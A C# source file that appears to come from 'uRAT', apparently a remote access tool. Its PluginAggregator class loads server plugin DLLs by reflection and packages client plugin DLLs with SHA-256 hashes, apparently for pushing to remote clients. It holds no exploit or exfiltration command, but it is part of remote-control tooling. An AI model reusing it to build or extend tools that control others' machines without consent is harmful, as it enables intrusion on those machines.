using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using uRAT.Server.Plugin.Server;
using uRAT.Server.Tools;
using uRAT.Server.Tools.Extensions;

namespace uRAT.Server.Plugin
{
    internal class PluginAggregator
    {
        internal class RemoteClientPlugin
        {
            public LoadedServerPluginHost AssociatedServerPluginHost;
            public Guid PluginGuid;
            public string Filepath;
            public byte[] Data;
            public byte[] Hash;

            public RemoteClientPlugin(string filepath, byte[] data, byte[] hash)
            {
                Filepath = filepath;
                Data = data;
                Hash = hash;
            }
        }

        internal class LoadedServerPluginHost
        {
            public Guid PluginHostGuid { get; set; }
            public IServerPluginHost PluginHost { get; set; }
            public bool Enabled { get; set; }

            public LoadedServerPluginHost(Guid pluginHostGuid, IServerPluginHost pluginHost, bool enabled)
            {
                PluginHostGuid = pluginHostGuid;
                PluginHost = pluginHost;
                Enabled = enabled;
            }
        }

        public List<LoadedServerPluginHost> LoadedPlugins { get; set; }
        public List<RemoteClientPlugin> LoadedRemotePlugins { get; set; }

        public void FetchPlugins()
        {
            LoadedPlugins = FetchPluginsImpl().ToList();
            for (var i = 0; i < LoadedPlugins.Count; i++)
                LoadedPlugins[i].Enabled = Globals.SettingsHelper.FetchPlugin(LoadedPlugins[i].PluginHostGuid).Enabled;
            LoadedPlugins.ForEach(lp =>
            {
                var pluginMd = Globals.SettingsHelper.FetchPlugin(lp.PluginHostGuid);
                if (lp.PluginHost.Plugins != null && pluginMd.Enabled)
                {
                    lp.PluginHost.Plugins.ForEach(lpp =>
                    {
                        if (lpp.PluginPackets != null)
                            lpp.PluginPackets.ForEach(lppp =>
                            {
                                Globals.PacketProcessor.PacketTable.Add(lppp.PacketId, lppp.GetType());
                            });
                        lpp.Initialize();
                    });
                }
            });
        }

        public void InitializePlugins()
        {
            foreach(var pluginHost in LoadedPlugins.Where(lp => lp.Enabled))
                foreach (var plugin in pluginHost.PluginHost.Plugins)
                    plugin.Initialize();
        }

        public void LoadPlugins()
        {
            LoadedPlugins = FetchPluginsImpl().ToList();
        }

        //TODO: make better
        private IEnumerable<LoadedServerPluginHost> FetchPluginsImpl()
        {
#if DEBUG
            foreach (var file in Directory.GetFiles(Directory.GetCurrentDirectory()))
#else
            foreach (var file in Directory.GetFiles(Application.StartupPath + "\\plugins\\server"))
#endif
            {
                if (!file.GetFileName().ToLower().Contains("plugin"))
                    continue;
                if (!file.GetFileName().EndsWith(".dll"))
                    continue;
                var asm = Assembly.LoadFile(file);
                var types = asm.GetTypes();
                var attribute = (GuidAttribute)asm.GetCustomAttributes(typeof(GuidAttribute), true)[0];
                foreach (var t in types)
                {
                    if (t.GetInterfaces().Contains(typeof (IServerPluginHost)) && !t.IsAbstract)
                        yield return
                            new LoadedServerPluginHost(new Guid(attribute.Value), Activator.CreateInstance(t) as IServerPluginHost,
                                true);
                }
            }
        }

        public void FetchRemotePlugins()
        {
            LoadedRemotePlugins = FetchRemotePluginsImpl().ToList();
        }

        private IEnumerable<RemoteClientPlugin> FetchRemotePluginsImpl()
        {

            foreach (var file in Directory.GetFiles(Application.StartupPath + "\\plugins\\client"))

            {
                if (!file.GetFileName().ToLower().Contains("plugin"))
                    continue;
                if (!file.GetFileName().EndsWith(".dll"))
                    continue;
                var fileBuff = File.ReadAllBytes(file);
                 var asm = Assembly.LoadFile(file);
                var attribute = (GuidAttribute)asm.GetCustomAttributes(typeof(GuidAttribute), true)[0];
                var remotePlugin = new RemoteClientPlugin(file, fileBuff, HashHelper.CalculateSha256(fileBuff))
                {
                    PluginGuid = new Guid(attribute.Value)
                };
                remotePlugin.AssociatedServerPluginHost =
                    LoadedPlugins.First(p => p.PluginHost.AssociatedClientPlugin.Equals(new Guid(attribute.Value)));
                yield return remotePlugin;
            }
        }
    }
}
